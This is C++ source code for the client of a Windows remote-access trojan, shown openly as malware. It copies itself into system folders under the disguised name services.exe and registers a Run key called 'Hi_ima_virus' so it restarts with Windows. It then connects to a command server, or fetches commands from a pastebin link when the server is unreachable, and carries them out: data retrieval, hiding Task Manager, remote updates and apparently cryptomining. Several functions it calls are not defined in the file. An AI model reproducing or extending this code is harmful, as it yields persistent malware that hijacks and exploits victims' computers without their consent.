//Client
#include "Includes.h"
SOCKET Connection;
HWND hwnd;
char path[MAX_PATH], filename[MAX_PATH];
int Connect();

void Startup()
{
	HKEY key;
	//std::cout << "Startup"; //Debug
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0, KEY_ALL_ACCESS, &key) == ERROR_SUCCESS) {
		RegSetValueEx(key, "Hi_ima_virus", 0, REG_SZ, (LPBYTE)path, sizeof(path));
	}
	else {
		RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &key);
		RegSetValueEx(key, "Hi_ima_virus", 0, REG_SZ, (LPBYTE)path, sizeof(path));
		RegCloseKey(key);
	}
}

void Commands(std::string str) {
	std::ifstream idi("services.dll", std::ios::binary);
	std::string id;
	if (idi.is_open()) {
		while (!idi.eof()) {
			getline(idi, id);
		}
	}
	idi.close();
	if (str.find("ID:") == 0) {
		str.erase(0, 3);
		std::cout << str;
		std::ofstream ide("services.dll", std::ios::binary);
		ide << str;
		ide.close();
	}
	if (str.find("Global") || str.find(id)) {
		//std::cout << "GID Passed"; //DEBUG
		if (str.find("Global") == 0) {
			str.erase(0, 7);
			std::cout << str;
		}
		if (str.find(id) == 0) {
			int Length;
			Length = id.length();
			Length++;
			str.erase(0, Length);
			//std::cout << "Trimmed:" << str.c_str(); //DEBUG
		}
		if (str.find("R") == 0) {
			std::cout << "R";
			DataRetreve();
			str.empty();
		}
		else if (str.find("Prank:Starwars") == 0) {
			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Sstart, NULL, NULL, NULL);
			str.empty();
		}
		/*else if (str.find("Prank:Gandalf") == 0) {
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GSax, NULL, NULL, NULL);
		str.empty();
		}*/
		else if (str.find("Prank:Messagebox") == 0) {
			MessageBox1();
			str.empty();
		}
		else if (str.find("Tm:Hide") == 0) {
			KillTaskMan();
			str.empty();
		}
		else if (str.find("Update") == 0) {
			str.erase(0, 7);
			Update(str);
			str.empty();
		}
		else if (str.find("Mine") == 0) {
			Mine();
			str.empty();
		}
		else {
			sendmessage("No such command");
		}
	}
	else if (!str.find("GLOBAL") || !str.find(id)) {
		//sendmessage("Not sent to this client");//DEBUG
	}
}

void ClientCommand() {
	char buffer[512];
	while (true) {
		std::string str;
		int CCheck = recv(Connection, buffer, sizeof(buffer), NULL);
		if (CCheck == SOCKET_ERROR) {
			closesocket(Connection);
			std::cout << "Server Disconnected" << std::endl;
			CloseHandle(ClientCommand);
			Connect();
		}
		str = buffer;
		Commands(str);


		Sleep(10);
	}
}

int Connect() {
	SOCKADDR_IN addr;
	HANDLE clientcommand;
	int addrlen = sizeof(addr);
	addr.sin_addr.s_addr = inet_addr("192.168.1.10");
	addr.sin_port = htons(1111);
	addr.sin_family = AF_INET;
connect1:
	Connection = socket(AF_INET, SOCK_STREAM, NULL);
	if (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
		int s = 0;
		if (s == 0) {
			std::string str;
			URLDownloadToFile(NULL, "http://pastebin.com/raw/rYQRHLsH", "i.html", 0, NULL);
			Sleep(5000);
			std::ifstream i("i.html");
			i >> str;
			std::cout << str;
			Commands(str);
			goto connect1;
			Sleep(15000);
		}
		else {
			std::ifstream id("services.dll", std::ios::in | std::ios::binary);
			std::string data;
			std::getline(id, data);
			id.close();
			if (data == "") {
				char MOTD[256] = "NULL";
				send(Connection, MOTD, sizeof(MOTD), NULL);
			}
			else {
				send(Connection, data.c_str(), sizeof(data), NULL);
			}

			HANDLE clientcommand = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ClientCommand, NULL, NULL, NULL);
		}
	}
}


int main() {

	WSAData wsaData;
	WORD DllVersion = MAKEWORD(2, 1);
	if (WSAStartup(DllVersion, &wsaData) != 0) {
		MessageBoxA(NULL, "Winsock startup failed", "Error", MB_OK | MB_ICONERROR);
		exit(1);
	}

	//hwnd = FindWindow("ConsoleWindowClass", NULL);
	//ShowWindow(hwnd, 0);
	GetWindowsDirectory(path, sizeof(path));
	GetModuleFileName(0, filename, sizeof(filename));
	strcat_s(path, "\\services.exe");
	//std::cout << "copyed"; //debug
	if (CopyFile(filename, path, 1)) {
		Startup();
	}
	else {
		SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, path);
		strcat_s(path, "\\Microsoft\\Windows\\Services.exe"); //C:\Users\bob\AppData\Roaming\Microsoft\Windows
		if (!CopyFile(filename, path, 0)) {
			std::cout << path << std::endl;
			std::cout << GetLastError();
		}
		else {
			Startup();
		}
		
	}
	Connect();
	getchar();
	return 0;
}

int sendmessage(std::string str) {
	//std::cout << str;//DEBUG
	int CCheck = send(Connection, str.c_str(), str.size(), NULL);
	if (CCheck == SOCKET_ERROR) {
		closesocket(Connection);
		return 1;
	}
	return 0;
}